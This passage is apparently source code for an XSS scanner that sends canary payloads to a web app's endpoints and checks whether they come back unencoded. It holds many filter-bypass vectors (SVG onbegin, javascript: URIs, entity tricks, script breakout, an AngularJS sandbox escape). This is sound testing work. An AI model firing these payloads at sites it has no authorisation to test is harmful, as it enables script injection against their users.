import { fileURLToPath } from 'url'

const R = '\x1b[0m', GREEN = '\x1b[32m', RED = '\x1b[31m',
      YLW = '\x1b[33m', BOLD = '\x1b[1m', DIM = '\x1b[2m', CYAN = '\x1b[36m'

// ── Helpers ────────────────────────────────────────────────────────────────────
function makeStats()  { return { passed: 0, failed: 0, errored: 0, skipped: 0 } }

function makeResult(stats) {
  return function result(label, status, detail = '') {
    const map = {
      pass: { sym: '✓', col: GREEN, key: 'passed'  },
      fail: { sym: '✗', col: RED,   key: 'failed'  },
      err:  { sym: '?', col: YLW,   key: 'errored' },
      skip: { sym: '–', col: DIM,   key: 'skipped' },
    }
    const { sym, col, key } = map[status]
    stats[key]++
    const det = detail ? ` ${DIM}${detail}${R}` : ''
    console.log(`    ${col}${sym}${R} ${label}${det}`)
  }
}

function section(title) { console.log(`\n${BOLD}${CYAN}▸ ${title}${R}`) }

async function req(url, opts = {}) {
  const t0 = Date.now()
  try {
    const res = await fetch(url, { redirect: 'manual', signal: AbortSignal.timeout(8000), ...opts })
    const elapsed = Date.now() - t0
    let body = ''
    try { body = await res.text() } catch {}
    let json = null
    try { json = JSON.parse(body) } catch {}
    return { status: res.status, body, json, elapsed, headers: res.headers, ok: res.status < 400 }
  } catch (e) {
    return { status: 0, body: '', json: null, elapsed: Date.now() - t0, error: e.message }
  }
}

// ── XSS-specific helpers ───────────────────────────────────────────────────────

// Unique canary unlikely to appear in normal content
const CANARY = 'xss7331test'

// Extract all inline <script> block contents from HTML
function extractScriptBlocks(html) {
  const blocks = []
  const re = /<script[^>]*>([\s\S]*?)<\/script>/gi
  let m
  while ((m = re.exec(html)) !== null) blocks.push(m[1])
  return blocks
}

// DOM sinks — operations that execute attacker-controlled content
const DOM_SINKS = [
  { re: /document\.write(?:ln)?\s*\(/,       name: 'document.write()' },
  { re: /\.innerHTML\s*=/,                    name: '.innerHTML' },
  { re: /\.outerHTML\s*=/,                    name: '.outerHTML' },
  { re: /\.insertAdjacentHTML\s*\(/,          name: '.insertAdjacentHTML()' },
  { re: /eval\s*\(/,                          name: 'eval()' },
  { re: /Function\s*\(/,                      name: 'Function()' },
  { re: /setTimeout\s*\(/,                    name: 'setTimeout()' },
  { re: /setInterval\s*\(/,                   name: 'setInterval()' },
  { re: /\$\s*\(\s*location/,                 name: '$(location…)' },
  { re: /\.html\s*\(/,                        name: '.html()' },
  { re: /\.attr\s*\(\s*['"]href['"]/,         name: '.attr("href")' },
  { re: /\.attr\s*\(\s*['"]src['"]/,          name: '.attr("src")' },
]

// DOM sources — user-controlled data
const DOM_SOURCES = [
  { re: /location\.search/, name: 'location.search' },
  { re: /location\.hash/,   name: 'location.hash'   },
  { re: /location\.href/,   name: 'location.href'   },
  { re: /document\.URL/,    name: 'document.URL'     },
  { re: /document\.referrer/, name: 'document.referrer' },
  { re: /window\.name/,     name: 'window.name'     },
]

// Returns { sinks[], sources[] } for a script block if both are present
function findSourceSinkInScript(script) {
  const sinks   = DOM_SINKS.filter(s => s.re.test(script)).map(s => s.name)
  const sources = DOM_SOURCES.filter(s => s.re.test(script)).map(s => s.name)
  return (sinks.length && sources.length) ? { sinks, sources } : null
}

// Common parameter names to probe for reflection
const REFLECT_PARAMS = [
  'q', 's', 'search', 'query', 'id', 'name', 'value', 'input',
  'text', 'msg', 'message', 'comment', 'url', 'redirect', 'ref', 'title',
]

// Build a list of probe targets from the endpoint list + common fallback paths
function probeTargets(base, endpoints = []) {
  const seen = new Set()
  const out  = []

  for (const ep of endpoints) {
    const url = `${base}${ep.path.replace(/:([a-zA-Z_]+)/g, '1')}`
    if (seen.has(`${ep.method}:${url}`)) continue
    seen.add(`${ep.method}:${url}`)
    out.push({ method: ep.method, url, params: ep.queryParams || [], fields: ep.bodyFields || [] })
  }

  const FALLBACK_PATHS = [
    '/', '/home', '/search', '/api/search', '/products', '/blog',
    '/comments', '/user/profile', '/api/user',
  ]
  for (const p of FALLBACK_PATHS) {
    const url = `${base}${p}`
    if (seen.has(`GET:${url}`)) continue
    seen.add(`GET:${url}`)
    out.push({ method: 'GET', url, params: [], fields: [] })
  }

  return out
}

// Fetch an HTML page
async function fetchPage(url, cookie) {
  return req(url, {
    headers: { Accept: 'text/html,*/*', ...(cookie ? { Cookie: cookie } : {}) },
  })
}

// ══════════════════════════════════════════════════════════════════════════════
// 1  · REFLECTED XSS INTO HTML CONTEXT WITH NOTHING ENCODED
// 12 · REFLECTED DOM XSS
// ══════════════════════════════════════════════════════════════════════════════
export async function testReflectedXssHtml(base, endpoints = [], cookie, result) {
  section('1 · Reflected XSS in HTML context / Reflected DOM XSS  (cats 1, 12)')

  const targets = probeTargets(base, endpoints).filter(t => t.method === 'GET')
  const headers = cookie ? { Cookie: cookie } : {}

  const PAYLOADS = [
    { label: '<script> tag',  payload: `<script>${CANARY}</script>`,    expect: `<script>${CANARY}` },
    { label: '<img> onerror', payload: `<img src=x onerror=${CANARY}>`, expect: `onerror=${CANARY}` },
    { label: '<svg> onload',  payload: `<svg onload=${CANARY}>`,        expect: `onload=${CANARY}` },
    { label: '<body> onload', payload: `<body onload=${CANARY}>`,        expect: `onload=${CANARY}` },
  ]

  console.log(`\n    ${DIM}Probing up to ${Math.min(targets.length, 6)} GET endpoints for unencoded HTML reflection...${R}`)

  let tested = false
  let foundVuln = false

  for (const { url } of targets.slice(0, 6)) {
    for (const param of REFLECT_PARAMS.slice(0, 4)) {
      let gotResponse = false

      for (const { label, payload, expect } of PAYLOADS) {
        const probeUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`
        const r = await req(probeUrl, { headers })
        if (r.status === 0 || r.status === 404) continue
        tested = true
        gotResponse = true

        if (r.body.includes(expect)) {
          foundVuln = true
          result(`Reflected XSS — ${label} via ?${param}  [${url.replace(base, '') || '/'}]`,
                 'fail', `payload reflected unencoded in HTML response (HTTP ${r.status})`)
        }

        // Reflected DOM XSS: canary lands inside a <script> block
        const scripts = extractScriptBlocks(r.body)
        if (scripts.some(s => s.includes(CANARY))) {
          foundVuln = true
          result(`Reflected DOM XSS — ?${param} value appears inside <script> block  [${url.replace(base, '') || '/'}]`,
                 'fail', 'server-reflected value flows into script context — verify if it reaches a DOM sink')
        }
      }

      if (gotResponse) break   // move on to next endpoint once we found a responding param
    }
  }

  if (!tested) {
    result('No reachable GET endpoints for reflected XSS probing', 'skip',
           'provide an endpoint list or point bass-xss at an app origin that serves HTML')
  } else if (!foundVuln) {
    result('Reflected XSS / Reflected DOM XSS — no unencoded reflections detected', 'pass',
           'sampled endpoints/params appear to encode or reject injected HTML')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 2  · STORED XSS INTO HTML CONTEXT WITH NOTHING ENCODED
// 13 · STORED DOM XSS
// ══════════════════════════════════════════════════════════════════════════════
export async function testStoredXssHtml(base, endpoints = [], cookie, result) {
  section('2 · Stored XSS in HTML context / Stored DOM XSS  (cats 2, 13)')

  if (!cookie) {
    result('No session cookie provided', 'skip', 'stored XSS tests require an authenticated session')
    return
  }

  const posts = probeTargets(base, endpoints)
    .filter(t => ['POST', 'PUT', 'PATCH'].includes(t.method) &&
                 !/logout|signout/i.test(t.url))

  if (!posts.length) {
    result('No POST/PUT endpoints found', 'skip', 'provide an endpoint list')
    return
  }

  const PAYLOAD = `<img src=x onerror=${CANARY}>`
  const AUTH    = { Cookie: cookie }

  console.log(`\n    ${DIM}Submitting stored XSS payload to ${Math.min(posts.length, 4)} POST endpoints, then checking GET responses...${R}`)

  for (const { url, fields } of posts.slice(0, 4)) {
    const fieldNames = fields.length
      ? fields
      : ['comment', 'message', 'content', 'name', 'title', 'body', 'text', 'description']

    const body = Object.fromEntries(fieldNames.map(f => [f, PAYLOAD]))

    const rPost = await req(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...AUTH },
      body: JSON.stringify(body),
    })
    if (rPost.status === 0 || rPost.status === 404) continue

    // Check base page and same endpoint for the stored payload
    let foundVuln = false
    for (const checkUrl of [base, `${base}/`, url]) {
      const r = await req(checkUrl, { headers: AUTH })
      if (!r.body) continue

      if (r.body.includes(`onerror=${CANARY}`)) {
        foundVuln = true
        result(`Stored XSS — payload stored via ${url.replace(base, '')} reflected unencoded at ${checkUrl.replace(base, '') || '/'}`,
               'fail', `POST → ${rPost.status}; payload appears unencoded in GET response`)
        break
      }

      // Stored DOM XSS: payload lands inside a <script> block
      if (extractScriptBlocks(r.body).some(s => s.includes(CANARY))) {
        foundVuln = true
        result(`Stored DOM XSS — data from ${url.replace(base, '')} appears inside <script> at ${checkUrl.replace(base, '') || '/'}`,
               'fail', 'stored value flows into script context — verify if it reaches a DOM sink')
        break
      }
    }

    if (!foundVuln) {
      result(`Stored XSS probe — ${url.replace(base, '')}`, 'pass',
             `POST → ${rPost.status}; payload not found unencoded in checked GET responses`)
    }
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 3  · DOM XSS IN document.write SINK USING SOURCE location.search
// 10 · DOM XSS IN document.write SINK INSIDE A SELECT ELEMENT
// ══════════════════════════════════════════════════════════════════════════════
export async function testDomXssDocumentWrite(base, endpoints = [], cookie, result) {
  section('3 · DOM XSS — document.write(location.search) sink  (cats 3, 10)')

  const targets = probeTargets(base, endpoints).filter(t => t.method === 'GET')
  let checked = 0
  let foundVuln = false

  for (const { url } of targets.slice(0, 8)) {
    const r = await fetchPage(url, cookie)
    if (r.status === 0 || r.status === 404 || !r.body.includes('<')) continue
    checked++

    for (const script of extractScriptBlocks(r.body)) {
      const hasWrite  = /document\.write(?:ln)?\s*\(/.test(script)
      const srcSearch = /location\.search/.test(script)
      const srcHash   = /location\.hash/.test(script)

      if (hasWrite && srcSearch) {
        foundVuln = true
        const inSelect = /<select/i.test(r.body)
        result(`DOM XSS: document.write(location.search)${inSelect ? ' inside <select>' : ''}  [${url.replace(base, '') || '/'}]`,
               'fail',
               inSelect
                 ? 'location.search injected via document.write into a <select> element — option injection'
                 : 'location.search flows into document.write — attacker controls injected HTML')
      } else if (hasWrite && srcHash) {
        foundVuln = true
        result(`DOM XSS: document.write(location.hash)  [${url.replace(base, '') || '/'}]`,
               'fail', 'location.hash flows into document.write')
      } else if (hasWrite) {
        result(`document.write() present without clear user-controlled source  [${url.replace(base, '') || '/'}]`,
               'err', 'manual review recommended — verify data flowing into document.write()')
      }
    }
  }

  if (!checked) {
    result('No HTML pages found for document.write DOM XSS analysis', 'skip',
           'point bass-xss at an app origin that serves HTML pages')
  } else if (!foundVuln) {
    result(`Scanned ${checked} page(s) — no location.search → document.write chain detected`, 'pass')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 4 · DOM XSS IN innerHTML SINK USING SOURCE location.search
// ══════════════════════════════════════════════════════════════════════════════
export async function testDomXssInnerHtml(base, endpoints = [], cookie, result) {
  section('4 · DOM XSS — innerHTML / outerHTML / insertAdjacentHTML sink  (cat 4)')

  const targets = probeTargets(base, endpoints).filter(t => t.method === 'GET')
  let checked = 0
  let foundVuln = false

  for (const { url } of targets.slice(0, 8)) {
    const r = await fetchPage(url, cookie)
    if (r.status === 0 || r.status === 404 || !r.body.includes('<')) continue
    checked++

    for (const script of extractScriptBlocks(r.body)) {
      const hasSink = /\.innerHTML\s*=|\.outerHTML\s*=|\.insertAdjacentHTML\s*\(/.test(script)
      if (!hasSink) continue

      const sources = DOM_SOURCES.filter(s => s.re.test(script))
      if (!sources.length) continue

      foundVuln = true
      const sinkName = /\.innerHTML\s*=/.test(script) ? 'innerHTML' :
                       /\.outerHTML\s*=/.test(script) ? 'outerHTML' : 'insertAdjacentHTML'
      result(`DOM XSS: ${sinkName} ← ${sources.map(s => s.name).join(', ')}  [${url.replace(base, '') || '/'}]`,
             'fail', `user-controlled source flows directly into ${sinkName} — raw HTML injected into DOM`)
    }
  }

  if (!checked) {
    result('No HTML pages found for innerHTML DOM XSS analysis', 'skip')
  } else if (!foundVuln) {
    result(`Scanned ${checked} page(s) — no dangerous source → innerHTML chain detected`, 'pass')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 5 · DOM XSS IN jQuery anchor href ATTRIBUTE SINK USING location.search SOURCE
// 6 · DOM XSS IN jQuery SELECTOR SINK USING A hashchange EVENT
// ══════════════════════════════════════════════════════════════════════════════
export async function testDomXssJquery(base, endpoints = [], cookie, result) {
  section('5 · DOM XSS in jQuery sinks — href attr + hashchange selector  (cats 5, 6)')

  const targets = probeTargets(base, endpoints).filter(t => t.method === 'GET')
  let checked = 0
  let jqueryFound = false
  let foundVuln = false

  for (const { url } of targets.slice(0, 8)) {
    const r = await fetchPage(url, cookie)
    if (r.status === 0 || r.status === 404 || !r.body.includes('<')) continue
    checked++

    if (/jquery/i.test(r.body)) jqueryFound = true

    for (const script of extractScriptBlocks(r.body)) {
      // Cat 5: .attr('href', location.search-derived value)
      if (/\.attr\s*\(\s*['"]href['"]/.test(script)) {
        const sources = DOM_SOURCES.filter(s => s.re.test(script))
        if (sources.length) {
          foundVuln = true
          result(`DOM XSS: .attr("href") ← ${sources.map(s => s.name).join(', ')}  [${url.replace(base, '') || '/'}]`,
                 'fail', 'user-controlled source used in .attr("href") — attacker can inject javascript: URI')
        }
      }

      // Cat 6: $(location.hash) in hashchange handler
      const hashchangeHandler = /hashchange/.test(script)
      const jqSelectorOnHash  = /\$\s*\(\s*location\.hash/.test(script) ||
        (hashchangeHandler && /\$\s*\(/.test(script) && /location\.hash/.test(script))

      if (hashchangeHandler && jqSelectorOnHash) {
        foundVuln = true
        result(`DOM XSS: $(location.hash) in hashchange handler  [${url.replace(base, '') || '/'}]`,
               'fail', 'jQuery selector fed directly from location.hash — hash value executed as HTML')
      }

      // .html() with user-controlled source
      if (/\.html\s*\(/.test(script)) {
        const sources = DOM_SOURCES.filter(s => s.re.test(script))
        if (sources.length) {
          foundVuln = true
          result(`DOM XSS: .html() ← ${sources.map(s => s.name).join(', ')}  [${url.replace(base, '') || '/'}]`,
                 'fail', 'jQuery .html() with user-controlled source — raw HTML injected into DOM')
        }
      }
    }
  }

  if (!checked) {
    result('No HTML pages found for jQuery DOM XSS analysis', 'skip')
  } else if (!jqueryFound) {
    result('jQuery not detected on scanned pages — jQuery-specific sinks not applicable', 'pass')
  } else if (!foundVuln) {
    result(`Scanned ${checked} jQuery page(s) — no dangerous href/hashchange sink chain detected`, 'pass')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 7 · REFLECTED XSS INTO ATTRIBUTE WITH ANGLE BRACKETS HTML-ENCODED
// 8 · STORED XSS INTO ANCHOR href ATTRIBUTE WITH DOUBLE QUOTES HTML-ENCODED
// ══════════════════════════════════════════════════════════════════════════════
export async function testXssInAttributes(base, endpoints = [], cookie, result) {
  section('7 · Reflected/stored XSS in HTML attribute context  (cats 7, 8)')

  const targets = probeTargets(base, endpoints)
  const authH   = cookie ? { Cookie: cookie } : {}

  // Cat 7: angle brackets encoded but " is not → break out of attribute value
  const ATTR_PROBES = [
    { desc: 'double-quote attribute breakout',        payload: `" ${CANARY}="`,           expect: `" ${CANARY}="` },
    { desc: 'event handler via " breakout',           payload: `" onmouseover="${CANARY}"`, expect: `onmouseover="${CANARY}"` },
    { desc: 'single-quote attribute breakout',        payload: `' ${CANARY}='`,            expect: `' ${CANARY}='` },
  ]

  // Cat 8: javascript: URI in href/src — not stripped even when " is encoded
  const HREF_PROBES = [
    { desc: 'javascript: URI in href',                payload: `javascript:${CANARY}`,                  expect: `javascript:${CANARY}` },
    { desc: 'javascript: with URL-encoded colon',     payload: `javascript%3A${CANARY}`,                expect: `javascript:${CANARY}` },
    { desc: 'javascript: with capital letters',       payload: `JaVaScRiPt:${CANARY}`,                  expect: CANARY },
  ]

  console.log(`\n    ${DIM}Probing ${Math.min(targets.length, 5)} endpoints for attribute-context XSS...${R}`)

  let tested = false
  let foundVuln = false

  for (const { url, fields } of targets.filter(t => t.method === 'GET').slice(0, 5)) {
    for (const param of REFLECT_PARAMS.slice(0, 3)) {
      let gotResponse = false

      for (const { desc, payload, expect } of ATTR_PROBES) {
        const probeUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`
        const r = await req(probeUrl, { headers: authH })
        if (r.status === 0 || r.status === 404) continue
        tested = true
        gotResponse = true

        if (r.body.includes(expect)) {
          foundVuln = true
          result(`Reflected XSS in attribute — ${desc} via ?${param}  [${url.replace(base, '') || '/'}]`,
                 'fail', 'angle brackets encoded but " (or \') is not — attacker escapes attribute context')
        }
      }

      for (const { desc, payload, expect } of HREF_PROBES) {
        const probeUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`
        const r = await req(probeUrl, { headers: authH })
        if (r.status === 0 || r.status === 404) continue
        tested = true
        gotResponse = true

        if (r.body.includes(expect)) {
          foundVuln = true
          result(`Reflected XSS via href — ${desc} in ?${param}  [${url.replace(base, '') || '/'}]`,
                 'fail', 'javascript: URI not stripped from href — clicking link executes JS')
        }
      }

      if (gotResponse) break
    }
  }

  // Cat 8 (stored): POST endpoint that accepts URL/link fields
  if (cookie) {
    for (const { url, fields } of targets.filter(t => ['POST','PUT','PATCH'].includes(t.method)).slice(0, 3)) {
      const urlFields = fields.filter(f => /url|link|href|src|redirect|website/i.test(f))
      if (!urlFields.length) urlFields.push('url', 'website', 'link')

      for (const field of urlFields.slice(0, 2)) {
        const rPost = await req(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Cookie: cookie },
          body: JSON.stringify({ [field]: `javascript:${CANARY}` }),
        })
        if (rPost.status === 0 || rPost.status === 404) continue
        tested = true

        const rGet = await req(url, { headers: { Cookie: cookie } })
        if (rGet.body && rGet.body.includes(`javascript:${CANARY}`)) {
          foundVuln = true
          result(`Stored XSS in href — javascript: URI accepted in "${field}" at ${url.replace(base, '')}`,
                 'fail', `POST → ${rPost.status}; href stored with javascript: scheme`)
        }
      }
    }
  }

  if (!tested) {
    result('No reachable endpoints for attribute-context XSS probing', 'skip')
  } else if (!foundVuln) {
    result('Attribute-context XSS — no unencoded quote or javascript: href detected', 'pass')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 9  · REFLECTED XSS INTO A JAVASCRIPT STRING WITH ANGLE BRACKETS HTML ENCODED
// 18 · REFLECTED XSS INTO A JAVASCRIPT STRING WITH SINGLE QUOTE AND BACKSLASH ESCAPED
// 19 · REFLECTED XSS INTO A JAVASCRIPT STRING WITH ANGLE BRACKETS AND DOUBLE QUOTES
//      HTML-ENCODED AND SINGLE QUOTES ESCAPED
// 21 · REFLECTED XSS INTO A TEMPLATE LITERAL WITH ALL SPECIAL CHARS ESCAPED
// ══════════════════════════════════════════════════════════════════════════════
export async function testXssInJsStrings(base, endpoints = [], cookie, result) {
  section('9 · Reflected XSS in JavaScript string / template literal context  (cats 9, 18, 19, 21)')

  const targets = probeTargets(base, endpoints).filter(t => t.method === 'GET')
  const headers = cookie ? { Cookie: cookie } : {}

  // Each probe targets a different bypass scenario
  const PROBES = [
    {
      // Cat 9: < > are HTML-encoded, but ' is NOT escaped inside a JS string
      desc: "single quote in JS string (cat 9)",
      payload: `'${CANARY}`,
      check: (body) => extractScriptBlocks(body).some(s => s.includes(`'${CANARY}`)),
    },
    {
      // Cat 18: ' is escaped with \, but \ itself is not escaped → \\' still closes the string
      desc: "backslash escaping the escape (cat 18)",
      payload: `\\'-${CANARY}`,
      check: (body) => extractScriptBlocks(body).some(s => s.includes(`\\'-${CANARY}`)),
    },
    {
      // Cat 19: all JS string chars encoded, but </script> tag break-out still works
      desc: "</script> block breakout (cat 19)",
      payload: `</script><script>${CANARY}</script>`,
      check: (body) => body.includes(`</script><script>${CANARY}`),
    },
    {
      // Cat 21: all chars encoded except ` — ${expression} inside template literal executes
      desc: "template literal \${expression} injection (cat 21)",
      payload: `\${${CANARY}}`,
      check: (body) => extractScriptBlocks(body).some(s => s.includes(`\${${CANARY}}`)),
    },
  ]

  console.log(`\n    ${DIM}Probing JS string / template literal injection contexts...${R}`)

  let tested = false
  let foundVuln = false

  for (const { url } of targets.slice(0, 5)) {
    for (const param of REFLECT_PARAMS.slice(0, 3)) {
      let gotResponse = false

      for (const { desc, payload, check } of PROBES) {
        const probeUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`
        const r = await req(probeUrl, { headers })
        if (r.status === 0 || r.status === 404) continue
        tested = true
        gotResponse = true

        if (check(r.body)) {
          foundVuln = true
          result(`XSS in JS string — ${desc} via ?${param}  [${url.replace(base, '') || '/'}]`,
                 'fail', 'payload appears in JS context without proper escaping')
        }
      }

      if (gotResponse) break
    }
  }

  if (!tested) {
    result('No reachable endpoints for JS string XSS probing', 'skip')
  } else if (!foundVuln) {
    result('JS string / template literal context — no injection detected', 'pass',
           'single quotes, backslash, and template literals appear correctly escaped in sampled params')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 11 · DOM XSS IN AngularJS EXPRESSION WITH ANGLE BRACKETS AND DOUBLE QUOTES
//      HTML-ENCODED
// ══════════════════════════════════════════════════════════════════════════════
export async function testAngularJsXss(base, endpoints = [], cookie, result) {
  section('11 · DOM XSS in AngularJS expression  (cat 11)')

  const targets = probeTargets(base, endpoints).filter(t => t.method === 'GET')
  const headers = cookie ? { Cookie: cookie } : {}
  let checked = 0
  let angularFound = false
  let foundVuln = false

  for (const { url } of targets.slice(0, 8)) {
    const r = await fetchPage(url, cookie)
    if (r.status === 0 || r.status === 404 || !r.body.includes('<')) continue
    checked++

    // Detect AngularJS (v1.x) — look for ng-app, ng-controller, or the angular.js script
    if (/angular(?:\.min)?\.js|ng-app|ng-controller|ng-model/i.test(r.body)) {
      angularFound = true
    } else {
      continue
    }

    // Probe: if {{7*7}} is reflected as 49 (not as the literal string), AngularJS evaluated it
    for (const param of REFLECT_PARAMS.slice(0, 4)) {
      const probeUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent('{{7*7}}')}`
      const rProbe   = await req(probeUrl, { headers })
      if (rProbe.status === 0) continue

      const reflected49     = rProbe.body.includes('49') && !rProbe.body.includes('{{7*7}}')
      const reflectedRaw    = rProbe.body.includes('{{7*7}}')

      if (reflected49) {
        foundVuln = true
        result(`AngularJS template injection — {{7*7}} evaluated to 49 via ?${param}  [${url.replace(base, '') || '/'}]`,
               'fail', 'AngularJS executed server-reflected expression — attacker can run arbitrary JS via {{constructor.constructor("alert(1)")()}}')
      } else if (reflectedRaw) {
        result(`AngularJS expression reflected unprocessed via ?${param}  [${url.replace(base, '') || '/'}]`,
               'err', 'expression in HTML — check whether ng-app scope processes it client-side')
      }

      if (rProbe.status < 500) break
    }
  }

  if (!checked) {
    result('No HTML pages found for AngularJS analysis', 'skip')
  } else if (!angularFound) {
    result('AngularJS (v1.x) not detected on scanned pages', 'pass',
           'no ng-app / angularjs script references found')
  } else if (!foundVuln) {
    result('AngularJS expression injection — no template evaluation detected', 'pass')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 14 · REFLECTED XSS INTO HTML CONTEXT WITH MOST TAGS AND ATTRIBUTES BLOCKED
// 15 · REFLECTED XSS INTO HTML CONTEXT WITH ALL TAGS BLOCKED EXCEPT CUSTOM ONES
// 16 · REFLECTED XSS WITH SOME SVG MARKUP ALLOWED
// 17 · REFLECTED XSS IN CANONICAL LINK TAG
// 25 · REFLECTED XSS WITH EVENT HANDLERS AND href ATTRIBUTES BLOCKED
// 26 · REFLECTED XSS IN A JAVASCRIPT URL WITH SOME CHARACTERS BLOCKED
// ══════════════════════════════════════════════════════════════════════════════
export async function testXssFilterBypass(base, endpoints = [], cookie, result) {
  section('14 · XSS filter bypass — blocked tags, SVG, canonical link, JS URL  (cats 14–17, 25, 26)')

  const targets = probeTargets(base, endpoints).filter(t => t.method === 'GET')
  const headers = cookie ? { Cookie: cookie } : {}

  const BYPASS_PROBES = [
    // Cat 14: most common tags/attrs blocked — try less common HTML5 event handlers
    { desc: '<body onresize> (cat 14)',         payload: `<body onresize=${CANARY}>`,                    expect: `onresize=${CANARY}` },
    { desc: '<body onpageshow> (cat 14)',        payload: `<body onpageshow=${CANARY}>`,                  expect: `onpageshow=${CANARY}` },
    { desc: '<input autofocus onfocus> (cat 14)', payload: `<input onfocus=${CANARY} autofocus>`,          expect: `onfocus=${CANARY}` },
    { desc: '<details ontoggle> (cat 14)',       payload: `<details open ontoggle=${CANARY}>`,             expect: `ontoggle=${CANARY}` },

    // Cat 15: all standard tags blocked — custom HTML elements still work
    { desc: 'custom <xss> element (cat 15)',     payload: `<xss onmouseover=${CANARY}>`,                   expect: `onmouseover=${CANARY}` },
    { desc: 'custom element + tabindex (cat 15)', payload: `<xss id=x onfocus=${CANARY} tabindex=1>`,      expect: `onfocus=${CANARY}` },

    // Cat 16: SVG markup allowed
    { desc: 'SVG animatetransform (cat 16)',     payload: `<svg><animatetransform onbegin=${CANARY}>`,      expect: `onbegin=${CANARY}` },
    { desc: 'SVG animate onbegin (cat 16)',      payload: `<svg><animate onbegin=${CANARY}>`,               expect: `onbegin=${CANARY}` },
    { desc: '<svg> onload (cat 16)',             payload: `<svg onload=${CANARY}>`,                         expect: `onload=${CANARY}` },
    { desc: '<svg><script> (cat 16)',            payload: `<svg><script>${CANARY}</script>`,                expect: `<script>${CANARY}` },

    // Cat 17: canonical link tag with accesskey — requires user interaction
    { desc: 'canonical link + accesskey (cat 17)', payload: `<link rel=canonical href='${CANARY}' accesskey=x onclick=${CANARY}>`, expect: `onclick=${CANARY}` },

    // Cat 25: event handlers and href blocked — try non-event-handler vectors
    { desc: 'object data=javascript: (cat 25)', payload: `<object data="javascript:${CANARY}">`,           expect: `javascript:${CANARY}` },
    { desc: '<math><mtext><option> (cat 25)',    payload: `<math><mtext><option><FAKEFAKE><option onfocus=${CANARY}>`, expect: `onfocus=${CANARY}` },

    // Cat 26: javascript: with some chars filtered — alternate forms
    { desc: 'javascript: via entity (cat 26)',   payload: `<a href="&#106;avascript:${CANARY}">x</a>`,    expect: CANARY },
    { desc: 'javascript: throw pattern (cat 26)', payload: `<a href="javascript:throw/${CANARY}">x</a>`,  expect: `throw/${CANARY}` },
    { desc: 'javascript: onerror throw (cat 26)', payload: `<a href="javascript:onerror=${CANARY},throw 1">x</a>`, expect: `onerror=${CANARY}` },
  ]

  console.log(`\n    ${DIM}Testing ${BYPASS_PROBES.length} filter bypass payloads on up to ${Math.min(targets.length, 4)} endpoints...${R}`)

  let tested = false
  let foundVuln = false

  for (const { url } of targets.slice(0, 4)) {
    for (const param of REFLECT_PARAMS.slice(0, 2)) {
      let gotResponse = false

      for (const { desc, payload, expect } of BYPASS_PROBES) {
        const probeUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`
        const r = await req(probeUrl, { headers })
        if (r.status === 0 || r.status === 404) continue
        tested = true
        gotResponse = true

        if (r.body.includes(expect)) {
          foundVuln = true
          result(`XSS filter bypass — ${desc} via ?${param}  [${url.replace(base, '') || '/'}]`,
                 'fail', 'bypass payload reflected unencoded — WAF/filter is incomplete')
        }
      }

      if (gotResponse) break
    }
  }

  if (!tested) {
    result('No reachable endpoints for filter bypass probing', 'skip')
  } else if (!foundVuln) {
    result('XSS filter bypass — no bypass payload reflected unencoded in sampled endpoints', 'pass')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 20 · STORED XSS INTO onclick EVENT WITH ANGLE BRACKETS AND DOUBLE QUOTES
//      HTML-ENCODED AND SINGLE QUOTES AND BACKSLASH ESCAPED
// ══════════════════════════════════════════════════════════════════════════════
export async function testStoredXssEventHandler(base, endpoints = [], cookie, result) {
  section('20 · Stored XSS into onclick event handler — HTML entity bypass  (cat 20)')

  if (!cookie) {
    result('No session cookie provided', 'skip', 'stored XSS event handler test requires authentication')
    return
  }

  const posts = probeTargets(base, endpoints)
    .filter(t => ['POST', 'PUT', 'PATCH'].includes(t.method))

  if (!posts.length) {
    result('No POST endpoints found', 'skip')
    return
  }

  // When < > " \ ' are all encoded/escaped, &apos; or &#x27; in stored HTML is decoded
  // back to ' by the browser when placed inside an event handler attribute value,
  // allowing the attacker to break out of the JS string inside onclick="..."
  const EVENT_BYPASS_PAYLOADS = [
    `&apos;-${CANARY}-&apos;`,       // HTML entity decoded in attribute context
    `&#x27;${CANARY}&#x27;`,          // hex entity
    `'${CANARY}'`,          // unicode literal of '
  ]

  const AUTH = { Cookie: cookie }

  for (const { url, fields } of posts.slice(0, 4)) {
    const fieldNames = fields.length ? fields : ['comment', 'name', 'website', 'message']
    let foundVuln = false

    for (const payload of EVENT_BYPASS_PAYLOADS) {
      const body = Object.fromEntries(fieldNames.map(f => [f, payload]))

      const rPost = await req(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...AUTH },
        body: JSON.stringify(body),
      })
      if (rPost.status === 0 || rPost.status === 404) continue

      const rGet = await req(url, { headers: AUTH })
      if (!rGet.body) continue

      // Look for canary inside an onclick or similar event handler attribute
      const onEventMatch = new RegExp(`on\\w+=([^>]*?)${CANARY}`, 'i').test(rGet.body)
      const attrMatch    = new RegExp(`=['"][^'"]*${CANARY}`, 'i').test(rGet.body)

      if (onEventMatch) {
        foundVuln = true
        result(`Stored XSS in event handler — HTML entity bypass at ${url.replace(base, '')}`,
               'fail', `canary appeared inside event handler attribute — &apos; decoded by browser to ' breaking JS string`)
        break
      } else if (attrMatch) {
        result(`Stored XSS — canary found inside HTML attribute at ${url.replace(base, '')}`,
               'err', 'manual review needed — canary in attribute context but not confirmed in event handler')
        break
      }
    }

    if (!foundVuln) {
      result(`Stored event handler XSS probe — ${url.replace(base, '')}`, 'pass',
             'HTML entity payloads not found in event handler context in GET response')
    }
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 22 · EXPLOITING XSS TO STEAL COOKIES
